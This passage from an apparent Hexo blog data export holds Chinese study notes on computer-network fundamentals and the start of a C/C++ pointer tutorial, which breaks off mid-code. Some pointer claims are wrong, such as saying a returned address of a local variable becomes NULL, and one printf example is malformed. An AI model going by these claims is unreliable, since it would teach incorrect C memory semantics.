8. 音/视频服务\n* 9. 无线网络\n* 10. 下一代因特网,IPV6,MPLS, P2P 文件共享的基本工作原理\n\n\n## 第一章概述详解\n* 1. \"三网\":电信网络,有线电视网络,计算机网络(因特网)\n* 2. 网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成.\n* 3. 路由器是实现分组交换的关键构件,其任务是转发收到的分组,这是网络核心部分最重要的功能.\n* 4. 电路交换:建立连接(占用通信资源)--->通话(一直占用通信资源)--->释放连接(归还通信资源);\n* 5. 分组交换采用存储转发技术:把要发送的整块数据成为一个报文,将长报文划分成为一个个更小的等长数据段,每个数据段为 1024 bit( 等于 128Byte ),每个数据段前面加一些控制信息组成的首部(包头,存储了目标地址与源地址),就构成了一个分组(包).\n* 6. 主机是为用户进行信息处理的,路由器则是用来转发分组的,进行分组交换的.路由器转发分组的过程就是因特网的核心,单个的网络简化成一条链路,路由器是核心结点\n* 7. 电路交换-->整个报文的比特流连续的从源点直达终点,好像在一个管道中传送.报文交换-->整个报文先传送到相邻结点,全部存储下来后查找转发表,转发到下一个结点.分组交换-->单个分组(这只是整个报文的一部分,最大 128Byte)传送到相邻结点,存储下来后查找转发表,转发到下一个结点.\n* 8. 广域网/远程网,几十到几千公里,因特网的核心部分;城域网,一个城市5-50km,采用以太网技术;局域网,微型计算机或工作站通过高速通信线路相连(速率通常在 10Mb/s 以上),1KM 左右,校园网/企业网;个人区域网/无限个人区域网 WPAN ,10m 左右,多处理机系统/集群;公用网/公众网,电信公司出资建造的大型网络;专用网,某个部分为本单位的特殊业务工作的需要而建造的网络;接入网,用来把用户接入因特网的网络,又称为本地接入网或居民接入网.\n* 9. 计算机网络的性能指标:\n    > 1 速度 b/s(比特每秒 bit/s),bps(bit per second);      \n    > 2 带宽,本来是指某个信号具有的频带宽度,信号的带宽是指该信号所包含的各种不同频率成份所占据的频率范围.电话信号的标准带宽是 3.1 kHz ,单位是赫;在计算机网络中带宽用来表示网络的通信线路所能传送数据的能力,因为网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的\"最高数据率\",通常意义上面我们都表示这个意思,单位是比特每秒,b/s;       \n    > 3 吞吐量,表示在单位时间内通过某个网络的数据量;       \n    > 4 时延是指数据(报文或者分组,比特)从网络(链路)的一端传到另一端所需要的时间,发送时延/传输时延是主机或路由器发送数据帧所需要的时间,也就是从发送数据帧的第一个比特算起到该帧的最后一个比特发送完毕所需要的时间,传播时延是电磁波在信道中传播一定的距离需要花费的时间,处理时延是指主机或者路由器在收到分组时要花费一定的时间进行处理,分析分组的头部,从分组中提取数据部分,进行插座检验或者查找适当的路由,排队时延是指在分组经过网络传输时,经过很多路由器,进入路由器后要先输入队列中排队等待处理;        \n    > 5 传播时延X带宽=传播时延带宽积/以比特为单位的链路长度,某段链路最大能承载多少个比特;      \n    > 6 往返时间 RTT,一来一回的时间;       \n    > 7 利用率有信道利用率与网络利用率 2 种,信道或者网络利用率过高会产生非常大的时延.      \n\n* 10. 计算机网络体系结构的形成\n>分层:      \n>> 1: 各层之间是独立的      \n>> 2: 灵活性好      \n>> 3: 结构上可分割开        \n>> 4: 易于实现和维护        \n>> 5: 能促进标准化工作;差错控制,流量控制,分段和重装,复用和分用,连接建立和释放;            \n\n> 体系结构      \n\n|OSI 的体系结构|TCP/IP 的体系结构|五层协议的体系结构|\n|---|---|---|\n应用层      |应用层(各种应用层协议,TELNET,FTP,SMTP,HTTP)|应用层|\n表示层      |                  同上                  |同上|\n会话层      |                  同上                  |同上|\n运输层      |运输层(TCP/UDP)                         |运输层|\n网络层      |网际层 IP                               |网络层|\n数据链路层   |网络接口层                              |数据链路层|\n物理层      |同上                                    |物理层|\n\n>> **应用层** 直接为用户的应用进程提供服务,进程是指正在运行的程序;HTTP,SMTP,FTP都是应用层协议       \n>> **运输层** 负责向 2 个主机中进程之间的通信提供服务,因为一个主机可以同时运行多个进程,所以运输层有复用和分用的功能;复用就是多个应用层进程可同时使用下面运输层的服务,分用则是运输层把收到的信息分别交付给上面应用层中的相应的进程;      \nTCP-->面向连接的,数据传输的单位是报文段,能够提供可靠的交付;     \nUDP-->无连接的,数据传输的单位是用户数据报,不保证提供可靠的交付,只能提供\"尽最大努力交付\"             \n>>   **网络层**  为分组交换网上的不同主机提供通信服务;发送数据时,网络层把运输层产生的报文段或用户数据报分装成分组或包进行传送;这个地方的网络是由大量的异构网络通过路由器相互连接起来.因特网的主要网络层协议是无连接的网际协议 IP 和许多种路由选择协议,也被称为网际层/IP 层;         \n>> **数据链路层** 两个主机之间的数据传输,总是在一段一段的链路上传送的,在两个相邻结点之间(主机和路由器之间或 2 个路由器之间)传送数据是直接传送的(点对点);这时需要专门的链路层协议,将网络层交付下来的 IP 数据报组装成帧,透明的传送帧数据,每一帧包括数据和必要的控制信息(同步信息,地址信息,差错控制)            \n>> **物理层** 透明的传送比特流;使用多大电压表示 1 或 0; 确定连接电缆的插头有多少根引脚以及如何连接;物理层不包含实物,比如双绞线,同轴电缆,光缆,无线信道,这些叫做物理媒体\n\n## 第二章物理层详解\n* 1. 物理层尽可能的将各种实体(各种实体线,铜线,光缆等)之间的差异进行兼容,从而避免影响数据链路层;\n* 2. 主要作用是规定接线器的形状,尺寸,引脚数目,排列,固定和锁定装置,标准化此类东西;确定线上的电压范围,确定电压表示的意义,确定各种可能事件的出现顺序.主要过程是由源点-->发送器-->传输系统-->接收器-->终点.\n\n\n\n# 计算机网络_第5版_中文版_严伟_潘爱民译_清华大学\n\n* 1. \n\n\n\n\n\n\n","slug":"Net/net","published":1,"updated":"2020-08-17T03:21:35.824Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cy1000q2gk7fanodk6j","content":"<h1 id=\"计算机网络-第五版-谢希任\"><a href=\"#计算机网络-第五版-谢希任\" class=\"headerlink\" title=\"计算机网络.第五版.谢希任\"></a>计算机网络.第五版.谢希任</h1><ul>\n<li><ol>\n<li>概述:因特网,管理协会,路由器,分组交换,计算机网络的类别,性能,体系结构</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>物理层</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>数据链路层</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>网络层</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>运输层/传输层</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>应用层</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>网络安全</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>音/视频服务</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>无线网络</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>下一代因特网,IPV6,MPLS, P2P 文件共享的基本工作原理</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"第一章概述详解\"><a href=\"#第一章概述详解\" class=\"headerlink\" title=\"第一章概述详解\"></a>第一章概述详解</h2><ul>\n<li><ol>\n<li>“三网”:电信网络,有线电视网络,计算机网络(因特网)</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成.</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>路由器是实现分组交换的关键构件,其任务是转发收到的分组,这是网络核心部分最重要的功能.</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>电路交换:建立连接(占用通信资源)—&gt;通话(一直占用通信资源)—&gt;释放连接(归还通信资源);</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>分组交换采用存储转发技术:把要发送的整块数据成为一个报文,将长报文划分成为一个个更小的等长数据段,每个数据段为 1024 bit( 等于 128Byte ),每个数据段前面加一些控制信息组成的首部(包头,存储了目标地址与源地址),就构成了一个分组(包).</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>主机是为用户进行信息处理的,路由器则是用来转发分组的,进行分组交换的.路由器转发分组的过程就是因特网的核心,单个的网络简化成一条链路,路由器是核心结点</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>电路交换–&gt;整个报文的比特流连续的从源点直达终点,好像在一个管道中传送.报文交换–&gt;整个报文先传送到相邻结点,全部存储下来后查找转发表,转发到下一个结点.分组交换–&gt;单个分组(这只是整个报文的一部分,最大 128Byte)传送到相邻结点,存储下来后查找转发表,转发到下一个结点.</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>广域网/远程网,几十到几千公里,因特网的核心部分;城域网,一个城市5-50km,采用以太网技术;局域网,微型计算机或工作站通过高速通信线路相连(速率通常在 10Mb/s 以上),1KM 左右,校园网/企业网;个人区域网/无限个人区域网 WPAN ,10m 左右,多处理机系统/集群;公用网/公众网,电信公司出资建造的大型网络;专用网,某个部分为本单位的特殊业务工作的需要而建造的网络;接入网,用来把用户接入因特网的网络,又称为本地接入网或居民接入网.</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>计算机网络的性能指标:<blockquote>\n<p>1 速度 b/s(比特每秒 bit/s),bps(bit per second);<br>2 带宽,本来是指某个信号具有的频带宽度,信号的带宽是指该信号所包含的各种不同频率成份所占据的频率范围.电话信号的标准带宽是 3.1 kHz ,单位是赫;在计算机网络中带宽用来表示网络的通信线路所能传送数据的能力,因为网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的”最高数据率”,通常意义上面我们都表示这个意思,单位是比特每秒,b/s;<br>3 吞吐量,表示在单位时间内通过某个网络的数据量;<br>4 时延是指数据(报文或者分组,比特)从网络(链路)的一端传到另一端所需要的时间,发送时延/传输时延是主机或路由器发送数据帧所需要的时间,也就是从发送数据帧的第一个比特算起到该帧的最后一个比特发送完毕所需要的时间,传播时延是电磁波在信道中传播一定的距离需要花费的时间,处理时延是指主机或者路由器在收到分组时要花费一定的时间进行处理,分析分组的头部,从分组中提取数据部分,进行插座检验或者查找适当的路由,排队时延是指在分组经过网络传输时,经过很多路由器,进入路由器后要先输入队列中排队等待处理;<br>5 传播时延X带宽=传播时延带宽积/以比特为单位的链路长度,某段链路最大能承载多少个比特;<br>6 往返时间 RTT,一来一回的时间;<br>7 利用率有信道利用率与网络利用率 2 种,信道或者网络利用率过高会产生非常大的时延.      </p>\n</blockquote>\n</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>计算机网络体系结构的形成<blockquote>\n<p>分层:      </p>\n<blockquote>\n<p>1: 各层之间是独立的<br>2: 灵活性好<br>3: 结构上可分割开<br>4: 易于实现和维护<br>5: 能促进标准化工作;差错控制,流量控制,分段和重装,复用和分用,连接建立和释放;            </p>\n</blockquote>\n</blockquote>\n</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<p>体系结构      </p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>OSI 的体系结构</th>\n<th>TCP/IP 的体系结构</th>\n<th>五层协议的体系结构</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>应用层</td>\n<td>应用层(各种应用层协议,TELNET,FTP,SMTP,HTTP)</td>\n<td>应用层</td>\n</tr>\n<tr>\n<td>表示层</td>\n<td>同上</td>\n<td>同上</td>\n</tr>\n<tr>\n<td>会话层</td>\n<td>同上</td>\n<td>同上</td>\n</tr>\n<tr>\n<td>运输层</td>\n<td>运输层(TCP/UDP)</td>\n<td>运输层</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>网际层 IP</td>\n<td>网络层</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>网络接口层</td>\n<td>数据链路层</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>同上</td>\n<td>物理层</td>\n</tr>\n</tbody></table>\n<blockquote>\n<blockquote>\n<p><strong>应用层</strong> 直接为用户的应用进程提供服务,进程是指正在运行的程序;HTTP,SMTP,FTP都是应用层协议<br><strong>运输层</strong> 负责向 2 个主机中进程之间的通信提供服务,因为一个主机可以同时运行多个进程,所以运输层有复用和分用的功能;复用就是多个应用层进程可同时使用下面运输层的服务,分用则是运输层把收到的信息分别交付给上面应用层中的相应的进程;<br>TCP–&gt;面向连接的,数据传输的单位是报文段,能够提供可靠的交付;<br>UDP–&gt;无连接的,数据传输的单位是用户数据报,不保证提供可靠的交付,只能提供”尽最大努力交付”<br>  <strong>网络层</strong>  为分组交换网上的不同主机提供通信服务;发送数据时,网络层把运输层产生的报文段或用户数据报分装成分组或包进行传送;这个地方的网络是由大量的异构网络通过路由器相互连接起来.因特网的主要网络层协议是无连接的网际协议 IP 和许多种路由选择协议,也被称为网际层/IP 层;<br><strong>数据链路层</strong> 两个主机之间的数据传输,总是在一段一段的链路上传送的,在两个相邻结点之间(主机和路由器之间或 2 个路由器之间)传送数据是直接传送的(点对点);这时需要专门的链路层协议,将网络层交付下来的 IP 数据报组装成帧,透明的传送帧数据,每一帧包括数据和必要的控制信息(同步信息,地址信息,差错控制)<br><strong>物理层</strong> 透明的传送比特流;使用多大电压表示 1 或 0; 确定连接电缆的插头有多少根引脚以及如何连接;物理层不包含实物,比如双绞线,同轴电缆,光缆,无线信道,这些叫做物理媒体</p>\n</blockquote>\n</blockquote>\n<h2 id=\"第二章物理层详解\"><a href=\"#第二章物理层详解\" class=\"headerlink\" title=\"第二章物理层详解\"></a>第二章物理层详解</h2><ul>\n<li><ol>\n<li>物理层尽可能的将各种实体(各种实体线,铜线,光缆等)之间的差异进行兼容,从而避免影响数据链路层;</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>主要作用是规定接线器的形状,尺寸,引脚数目,排列,固定和锁定装置,标准化此类东西;确定线上的电压范围,确定电压表示的意义,确定各种可能事件的出现顺序.主要过程是由源点–&gt;发送器–&gt;传输系统–&gt;接收器–&gt;终点.</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"计算机网络-第5版-中文版-严伟-潘爱民译-清华大学\"><a href=\"#计算机网络-第5版-中文版-严伟-潘爱民译-清华大学\" class=\"headerlink\" title=\"计算机网络_第5版_中文版_严伟_潘爱民译_清华大学\"></a>计算机网络_第5版_中文版_严伟_潘爱民译_清华大学</h1><ul>\n<li><ol>\n<li></li>\n</ol>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"计算机网络-第五版-谢希任\"><a href=\"#计算机网络-第五版-谢希任\" class=\"headerlink\" title=\"计算机网络.第五版.谢希任\"></a>计算机网络.第五版.谢希任</h1><ul>\n<li><ol>\n<li>概述:因特网,管理协会,路由器,分组交换,计算机网络的类别,性能,体系结构</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>物理层</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>数据链路层</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>网络层</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>运输层/传输层</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>应用层</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>网络安全</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>音/视频服务</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>无线网络</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>下一代因特网,IPV6,MPLS, P2P 文件共享的基本工作原理</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"第一章概述详解\"><a href=\"#第一章概述详解\" class=\"headerlink\" title=\"第一章概述详解\"></a>第一章概述详解</h2><ul>\n<li><ol>\n<li>“三网”:电信网络,有线电视网络,计算机网络(因特网)</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成.</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>路由器是实现分组交换的关键构件,其任务是转发收到的分组,这是网络核心部分最重要的功能.</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>电路交换:建立连接(占用通信资源)—&gt;通话(一直占用通信资源)—&gt;释放连接(归还通信资源);</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>分组交换采用存储转发技术:把要发送的整块数据成为一个报文,将长报文划分成为一个个更小的等长数据段,每个数据段为 1024 bit( 等于 128Byte ),每个数据段前面加一些控制信息组成的首部(包头,存储了目标地址与源地址),就构成了一个分组(包).</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>主机是为用户进行信息处理的,路由器则是用来转发分组的,进行分组交换的.路由器转发分组的过程就是因特网的核心,单个的网络简化成一条链路,路由器是核心结点</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>电路交换–&gt;整个报文的比特流连续的从源点直达终点,好像在一个管道中传送.报文交换–&gt;整个报文先传送到相邻结点,全部存储下来后查找转发表,转发到下一个结点.分组交换–&gt;单个分组(这只是整个报文的一部分,最大 128Byte)传送到相邻结点,存储下来后查找转发表,转发到下一个结点.</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>广域网/远程网,几十到几千公里,因特网的核心部分;城域网,一个城市5-50km,采用以太网技术;局域网,微型计算机或工作站通过高速通信线路相连(速率通常在 10Mb/s 以上),1KM 左右,校园网/企业网;个人区域网/无限个人区域网 WPAN ,10m 左右,多处理机系统/集群;公用网/公众网,电信公司出资建造的大型网络;专用网,某个部分为本单位的特殊业务工作的需要而建造的网络;接入网,用来把用户接入因特网的网络,又称为本地接入网或居民接入网.</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>计算机网络的性能指标:<blockquote>\n<p>1 速度 b/s(比特每秒 bit/s),bps(bit per second);<br>2 带宽,本来是指某个信号具有的频带宽度,信号的带宽是指该信号所包含的各种不同频率成份所占据的频率范围.电话信号的标准带宽是 3.1 kHz ,单位是赫;在计算机网络中带宽用来表示网络的通信线路所能传送数据的能力,因为网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的”最高数据率”,通常意义上面我们都表示这个意思,单位是比特每秒,b/s;<br>3 吞吐量,表示在单位时间内通过某个网络的数据量;<br>4 时延是指数据(报文或者分组,比特)从网络(链路)的一端传到另一端所需要的时间,发送时延/传输时延是主机或路由器发送数据帧所需要的时间,也就是从发送数据帧的第一个比特算起到该帧的最后一个比特发送完毕所需要的时间,传播时延是电磁波在信道中传播一定的距离需要花费的时间,处理时延是指主机或者路由器在收到分组时要花费一定的时间进行处理,分析分组的头部,从分组中提取数据部分,进行插座检验或者查找适当的路由,排队时延是指在分组经过网络传输时,经过很多路由器,进入路由器后要先输入队列中排队等待处理;<br>5 传播时延X带宽=传播时延带宽积/以比特为单位的链路长度,某段链路最大能承载多少个比特;<br>6 往返时间 RTT,一来一回的时间;<br>7 利用率有信道利用率与网络利用率 2 种,信道或者网络利用率过高会产生非常大的时延.      </p>\n</blockquote>\n</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>计算机网络体系结构的形成<blockquote>\n<p>分层:      </p>\n<blockquote>\n<p>1: 各层之间是独立的<br>2: 灵活性好<br>3: 结构上可分割开<br>4: 易于实现和维护<br>5: 能促进标准化工作;差错控制,流量控制,分段和重装,复用和分用,连接建立和释放;            </p>\n</blockquote>\n</blockquote>\n</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<p>体系结构      </p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>OSI 的体系结构</th>\n<th>TCP/IP 的体系结构</th>\n<th>五层协议的体系结构</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>应用层</td>\n<td>应用层(各种应用层协议,TELNET,FTP,SMTP,HTTP)</td>\n<td>应用层</td>\n</tr>\n<tr>\n<td>表示层</td>\n<td>同上</td>\n<td>同上</td>\n</tr>\n<tr>\n<td>会话层</td>\n<td>同上</td>\n<td>同上</td>\n</tr>\n<tr>\n<td>运输层</td>\n<td>运输层(TCP/UDP)</td>\n<td>运输层</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>网际层 IP</td>\n<td>网络层</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>网络接口层</td>\n<td>数据链路层</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>同上</td>\n<td>物理层</td>\n</tr>\n</tbody></table>\n<blockquote>\n<blockquote>\n<p><strong>应用层</strong> 直接为用户的应用进程提供服务,进程是指正在运行的程序;HTTP,SMTP,FTP都是应用层协议<br><strong>运输层</strong> 负责向 2 个主机中进程之间的通信提供服务,因为一个主机可以同时运行多个进程,所以运输层有复用和分用的功能;复用就是多个应用层进程可同时使用下面运输层的服务,分用则是运输层把收到的信息分别交付给上面应用层中的相应的进程;<br>TCP–&gt;面向连接的,数据传输的单位是报文段,能够提供可靠的交付;<br>UDP–&gt;无连接的,数据传输的单位是用户数据报,不保证提供可靠的交付,只能提供”尽最大努力交付”<br>  <strong>网络层</strong>  为分组交换网上的不同主机提供通信服务;发送数据时,网络层把运输层产生的报文段或用户数据报分装成分组或包进行传送;这个地方的网络是由大量的异构网络通过路由器相互连接起来.因特网的主要网络层协议是无连接的网际协议 IP 和许多种路由选择协议,也被称为网际层/IP 层;<br><strong>数据链路层</strong> 两个主机之间的数据传输,总是在一段一段的链路上传送的,在两个相邻结点之间(主机和路由器之间或 2 个路由器之间)传送数据是直接传送的(点对点);这时需要专门的链路层协议,将网络层交付下来的 IP 数据报组装成帧,透明的传送帧数据,每一帧包括数据和必要的控制信息(同步信息,地址信息,差错控制)<br><strong>物理层</strong> 透明的传送比特流;使用多大电压表示 1 或 0; 确定连接电缆的插头有多少根引脚以及如何连接;物理层不包含实物,比如双绞线,同轴电缆,光缆,无线信道,这些叫做物理媒体</p>\n</blockquote>\n</blockquote>\n<h2 id=\"第二章物理层详解\"><a href=\"#第二章物理层详解\" class=\"headerlink\" title=\"第二章物理层详解\"></a>第二章物理层详解</h2><ul>\n<li><ol>\n<li>物理层尽可能的将各种实体(各种实体线,铜线,光缆等)之间的差异进行兼容,从而避免影响数据链路层;</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>主要作用是规定接线器的形状,尺寸,引脚数目,排列,固定和锁定装置,标准化此类东西;确定线上的电压范围,确定电压表示的意义,确定各种可能事件的出现顺序.主要过程是由源点–&gt;发送器–&gt;传输系统–&gt;接收器–&gt;终点.</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"计算机网络-第5版-中文版-严伟-潘爱民译-清华大学\"><a href=\"#计算机网络-第5版-中文版-严伟-潘爱民译-清华大学\" class=\"headerlink\" title=\"计算机网络_第5版_中文版_严伟_潘爱民译_清华大学\"></a>计算机网络_第5版_中文版_严伟_潘爱民译_清华大学</h1><ul>\n<li><ol>\n<li></li>\n</ol>\n</li>\n</ul>\n"},{"title":"C/C++指针详解","date":"2020-05-08T03:41:32.000Z","_content":"\n![指针](指针.png)\n\n# 基础概念\n\n* 1. 1个字节就会有一个内存首地址,1个字节就是一个内存块.取地址专指取内存块的首地址.内存的最小单位就是1个字节.内存块:存储的就是值,例如20,\"1111\"等可以让我们直接使用的值;\n* 2. 变量定义时即分配内存,按照类型分配内存大小.\n        ```\n        char ch;//这个写法就在内存里面分配了1字节的大小,是在运行时已经分配了,但是没有用到而已,分配到哪里也不需要用户关心.\n        int a;//分配4字节\n        ```\n* 3. 内存首地址:存储的就是类似于一个数组的下标,只不过这个下标被编译器定义了,编译器定义它,不告诉你,但是你要知道它最大(指针的大小)就是32位或者64位,32位机器使用4字节存储指针,64位机器使用8字节存储指针.\n* 4. 内存首地址不是存储在内存块里面的,是CPU总线计算出来的,按照十进制表示:一般是 0-2的多少次方大小;可以使用十进制,二进制,八进制,十六进制表示.每次取地址,就计算出来这个内存首地址;内存块里面也可以存储内存首地址(也就是指针),因为内存首地址可以用十进制表示,也就是说指针是个十进制的数字而已,没有特别神奇的存储格式,仅仅是指针的含义与规则比较特殊.\n* 5. 可以根据内存首地址找到对应的内存块,叫做寻址;*p(寻址)操作的是内存首地址(指针)所指向的内存块\n* 6. 要把 char /int /float 等等 和 char* /int* /float* 等等类型看作是数据类型即可,int* 这个类型的优先级大于 int 的优先级\n* 7. ' * '号的意义\n        > 1,定义变量时,' * ' 代表的是类型(例如: int* p = 0x2498;p 就是指针类型 int* ,int是类型,int* 也是类型)        \n        > 2,在使用变量时,*代表操作指针所指向的内存.意思就是 *p 指向的就是p指针变量存储的内存首地址的内存块的值.         \n        > 3,' * '号在等号左边(int* p = 0xxxx;)表示在定义一块内存,' * '号操作必须操作指针变量,类型+'*'表示一个整体         \n        > 4,' * '号在等号右边,表示在操作内存块里面的值,哪个内存块,取决于指针变量里面存储的指针的值.*+指针变量表示一个整体         \n* 8. & 符号表示什么,如果&在指针变量之前表示什么,如果&在变量之前表示什么\n* 9. 变量:变量只要定义,就会分配这个变量所对应的内存首地址以及内存块,如果没有赋值,则内存块里面没有值而已,但是内存首地址一定是被分配了而且存在的.\n* 10. 指针:指针变量的值,就是内存首地址\n* 11. 指针变量:存储指针的一个变量,和普通变量一样\n* 12. 野指针:这个指针变量保存了一个没有意义(非法)的内存首地址,对野指针变量本身进行赋值,修改等没有问题,但是一旦对指针变量的值进行取地址操作,就会出现问题,因为是非法的.\n* 13. 空指针:给指针变量赋值位NULL,NULL就是个0.\n* 14. 万能指针使用的时候,需要将其转换为本身类型才能使用,例如 void* 转为 int* 才能使用\n* 14. 指针运算是和其类型相关的,加减乘除的时候都要附加类型大小才可以\n* 15. 数组的变量本身就是个内存首地址,int a[10]; a 本身就是个内存首地址 ;  所以 int* p = a; 是没有问题的\n* 16. 只要是指针 * 与 [] 对于取值是一个意思. *(p + i) 与 p[i] 是相等的,也就是    *(p+i) = p[i]\n\n\n\n# 套娃\n\n* 只要记住,内存首地址是 &变量 ,并且只能获取值 ;内存块是 *变量  可以获取值,也可以赋予值;内存首地址本质是纯数字;内存块本质也是纯数字,但是有其他表现形式;\n\n* 一级套娃\n```\nint a;\nint* p = &a; \n```\n* 二级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \n\n```\n* 三级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \nint*** w = &q; \n\n```\n* 多级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \nint*** w = &q; \nint**** e = &w; \n\n```\n\n# 函数传参\n* 1. 函数传参都是将变量内存块里面的值拷贝一份传输过去,指针(内存首地址)拷贝一份,就能连接到函数内与函数外的数据,就会方便很多.\n下面是错误例子:\n```\n        //void printf_Array(int *a) //2种写法等价,对编译器而言,没有任何区别,编译器都是当作 int * 类型处理\n        void printf_Array(int a[])\n        {\n                for (size_t i = 0; i < sizeof(a) / sizeof(a[0]); i++) {\n                        printf(\"%d,\", a[i]);\n                }\n                printf(\"\\n\");\n        }\n        int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n        printf_Array(array);\n        //这个地方传输的是a这个变量内存块里面的值,也就是数组第一个元素的内存首地址,而不是整个数组\n        //形参中的数组根本就不是数组,就是一个指针变量(内存首地址)\n```\n正确的例子是:\n```\n        void printf_Array(int *array,int length)\n        {\n                for (int i = 0; i < length; i++) {\n                        printf(\"%d,\", array[i]);\n                }\n                printf(\"\\n\");\n        }\n        int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n        printf_Array(array,(sizeof(array) / sizeof(array[0])));\n\n```\n>结论:数组在作为函数的形参传递过程中,需要传递首地址,还要传递数组长度,函数才可以正确将数组解析出来.\n> 1. 形参中的数组不是数组,是普通的指针变量\n> 2. 形参数组: int a[10000],int a[],int * a,对编译器没有区别,编译器都是当作 int * 类型来处理\n> 3. 形参中的数组和非形参中的数组的区别:形参中的数组是指针变量,非形参数组就是数组\n\n* 2. 二维数组不是二级指针,指针数组才是二级指针\n\n# 指针数组和数组指针\n\n* 1. 指针数组,是数组,里面每个元素是指针.写法:\n```\nchar** a; char* a[];//这个叫做指针数组,不是叫做二维数组\n```\n* 2. 数组指针,是指针,指向数组的指针.\n```\n```\n* 3. 指针函数,是函数;错误案例,代码会直接报错,因为pointer_Function执行完毕会释放里面的变量,指针指向的值也被回收了,然后指针就指向了一个空的内存首地址,指针指向了 NULL,变成了空指针:\n```\nint * pointer_Function()\n{\n    int a = 200;\n    return &a;\n}\nvoid paFunction3()\n{\n    int* pf = pointer_Function();\n    printf(\"当前指针的内存首地址%p  当前指针内存块的值:%p  当前指针内存块所指向的内存的值:%d\\n\",&pf,pf,*pf);\n}\n\n```\n\n* 4. 函数指针,是指针\n\n* 5. 字符指针,这个是比较特殊的\n```\nchar str[] = \"hello\";\nprintf(\"%s\\n\",str);//里面是重写了输出方法\n//是下面的输出方式\nint i = 0;\nwhile(str[i]!= '\\0')\n{\n        printf(\"c\",str[i]);\n        i++;\n}\n//str本身还是首元素的内存首地址,只是输出比较特殊而已.本质还是个指针\nchar buf[100];\nchar* p = buf;\n\nstrcpy(p,\"wqrywegw\");//不是给p本身拷贝内容,而是给p指向的内存块拷贝内容.\n\n```\n\n\n# 字符串结束符\n\n0 数字0 与 '\\0' 在字符串中是一样的,都是结束符\n'\\0' accsi 的结束符,与数字0在字符串中是一样的\n'0' 字符0 ,在accsi中的数字表示是 48\n\nchar a[] = {'a','b'};\nprintf(\"%s\",a);//乱码,没有结束符\n\nchar a[10] = {'a','b'};\nprintf(\"%s\",a);//正常,自动补0\n\nchar a[] = {'a','b',0};\nchar a[] = {'a','b','\\0'};\nprintf(\"%s\",a);//正常\n\nchar a[] = {'a','b''0'};\nprintf(\"%s\",a);//乱码,没有结束符\n\nchar buf[] = \"hello\";\nprintf(\"%s\",buf);//正常,以字符串初始化,自动隐藏结束符'\\0'\n\n# 字符常量和字符指针数组\n```\n        void fun()\n        {\n                 printf(\"%p\\n\",\"aaa\");\n        }\n        printf(\"%p\\n\",\"aaa\");\n        printf(\"%p\\n\",\"aaa\");\n        fun();\n        printf(\"%s\\n\",\"aaa\"+1);//这种写法是正常的,因为这是将\"aaa\"当成内存首地址来使用的,类型是 char\n        printf(\"%c\\n\",*(\"aaa\"));//取出首元素\n        